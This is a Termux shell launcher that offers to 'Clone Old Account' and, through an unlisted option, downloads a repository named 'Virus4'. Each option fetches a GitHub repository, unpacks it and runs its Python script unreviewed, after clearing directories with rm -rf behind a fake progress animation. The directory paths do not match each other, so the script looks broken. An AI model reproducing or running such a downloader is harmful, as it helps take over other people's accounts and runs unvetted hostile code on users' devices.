g='\033[1;32m'
p='\033[1;35m'
clear
echo -e "\033[1;32m"
echo "         {Ctrl C} exit "
echo "?!?Welcome to Anjana Sarkar Tricker...??!"
echo "[1] Clone Old Account "
echo ""
echo -e "$p"
read -p  "Type One in Numeric====> " download

if [ "$download" -eq "1"  ]; then
 cd
 clear
 termux-setup-storage
 rm -rf $HOME/sarkar
 rm -rf $HOME/sarkar.zip
 rm -rf $HOME/sarkar
 clear
 echo -e $g 'Please Wait ===+['$p'>              '$g']\'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'->             '$g']|'
 sleep 0.4  
 clear
 echo -e $g 'Please Wait ===+['$p'-->            '$g']/'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'--->           '$g']\'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'---->          '$g']|'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'----->         '$g']/'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------>        '$g']|'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------>        '$g']\'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------>        '$g']/'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------->       '$g']|'
 sleep 0.6
 clear
 echo -e $g 'Please Wait ===+['$p'-------->      '$g']/'
 sleep 0.6
 clear
 echo -e $g 'Please Wait ===+['$p'--------->     '$g']\'
 sleep 0.6
 clear
 echo -e $g 'Please Wait ===+['$p'---------->    '$g']|'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'----------->   '$g']/'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'-------------> '$g']\'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'-------------->'$g']|'
 sleep 0.4
 clear 
 echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
 sleep 0.4
 mkdir /sdcard/sarkar
 mkdir /sdcard/sarkar/Encrypt
 cd
 git clone https://github.com/AnjanaSarkar786/AnjanaSarkar.git
 cd
 cd AnjanaSarkar
 mv -v AnjanaSarkar.zip $HOME
 cd
 rm -rf AnjanaSarkar
 cd
 unzip AnjanaSarkar.zip 
 cd AnjanaSarkar && chmod +x *
 cd $HOME/AnjanaSarkar
 chmod +x *
 cd
 rm -rf AnjanaSarkar
 rm -rf AnjanaSarkar.zip
 cd
 cd $HOME/sarkar/.tools
 chmod +x */*
 clear
 echo -e "$g+++++++++++>[$pWelcome to the Anjana Sarkar $p$g]<+++++++++++++"
 echo -e "     Hello      "
 echo -e "     $p     new "
 echo -e "     $g         Update "
 sleep 2 

 cd $HOME/anjana
 python2 anjana.py

elif [ "$download" -eq "2"  ]; then
 cd
 clear
 termux-setup-storage
 rm -rf $HOME/Virus
 rm -rf $HOME/Virus4.zip
 rm -rf $HOME/Virus4
 clear
 echo -e $g 'Please Wait ===+['$p'>              '$g']\'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'->             '$g']|'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'-->            '$g']/'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'--->           '$g']\'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'---->          '$g']|'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'----->         '$g']/'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------>        '$g']|'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------>        '$g']\'
 sleep 0.5   
 clear
 echo -e $g 'Please Wait ===+['$p'------>        '$g']/'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'------->       '$g']|'
 sleep 0.6
 clear
 echo -e $g 'Please Wait ===+['$p'-------->      '$g']/'
 sleep 0.6
 clear
 echo -e $g 'Please Wait ===+['$p'--------->     '$g']\'
 sleep 0.6
 clear
 echo -e $g 'Please Wait ===+['$p'---------->    '$g']|'
 sleep 0.5
 clear
 echo -e $g 'Please Wait ===+['$p'----------->   '$g']/'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'-------------> '$g']\'
 sleep 0.4
 clear
 echo -e $g 'Please Wait ===+['$p'-------------->'$g']|'
 sleep 0.4
 clear 
 echo -e "$g+++++++++++++++>$p[Please Wait]$g<++++++++++++++"
 sleep 0.4
 cd
 git clone https://github.com/amerlaceset/Virus4
 cd Virus4
 chmod +x *
 clear
 echo -e "$g+++++++++++>[$pWelcome to the new update$p$g]<+++++++++++++"
 echo -e "     Hello      "
 echo -e "     $p     new "
 echo -e "     $g         Update "
 sleep 2
 python2 Virus4.py
 
else :
 bash sarkar.sh
fi
